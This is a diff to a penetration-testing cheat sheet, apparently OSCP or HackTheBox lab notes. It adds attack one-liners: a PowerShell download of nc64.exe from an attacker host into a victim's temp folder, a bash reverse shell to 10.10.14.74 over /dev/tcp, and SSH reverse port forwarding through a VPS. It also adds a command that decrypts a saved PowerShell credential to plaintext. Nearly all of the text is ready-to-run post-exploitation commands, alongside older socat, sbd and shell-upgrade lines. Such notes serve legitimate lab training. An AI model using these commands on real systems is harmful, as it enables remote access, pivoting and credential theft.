@@ -50,8 +50,9 @@ socat - OPENSSL:10.11.0.4:443,verify=0
 * PowerShell File Transfers
 
 ```
-powershell -c "(new-object System.Net.WebClient).DownloadFile('http:/
-/10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
+powershell Invoke-Webrequest -Uri http://10.10.14.74:4757/nc64.exe -OutFile C:\Data\Users\DefaultAccount\AppData\Local\Temp\nc64.exe
+
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
 ```
 
 Download and run powershell script without saving it to the victim hard disk.
@@ -176,8 +177,8 @@ dirb http://www.megacorpone.com
 ## SSH Port Forwarding
 
 ```
-ssh -N -L 8080:10.11.8.128:80 10.11.8.127
-ssh -N -R 10.11.8.128:8080:localhost:80 10.11.8.128
+ssh -N -L vps-ip:8080:10.10.10.203:80 vps_ip
+ssh -N -R vps-ip:8080:localhost:80 user@htb-ip
 ssh -N -D 127.0.0.1:8080 student@10.11.8.128
 ```
 
@@ -240,6 +241,13 @@ ncat -nv <ip_to_connect> 4444
 sbd -lp 4444 -k secret -e /bin/bash
 sbd -k secret 127.0.0.1 4444
 ```
+
+* Bash Shell
+
+```
+/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.74/4757 0>&1"
+```
+
 
 * Socat Shells
 
@@ -399,7 +407,10 @@ MIB Values
 
 ```
 // temporarily allow unsigned scripts to execute
-powershell -ExecutionPolicy Bypass -File admin_login.psl
+powershell -ExecutionPolicy Bypass -File admin_login.ps1
+
+// decrypt securestring exported to xml file
+powershell -c "$credential = Import-CliXml -Path c:\creds.xml;$credential.GetNetworkCredential().Password"
 ```
 
 ## Running local http servers
@@ -416,7 +427,7 @@ busybox httpd -f -p 18880
 
 ```
 python -c 'import pty; pty.spawn("/bin/bash") '
-ash -i 2>&1
+bash -i 2>&1
 ```
 
 ## Powershell to cmd
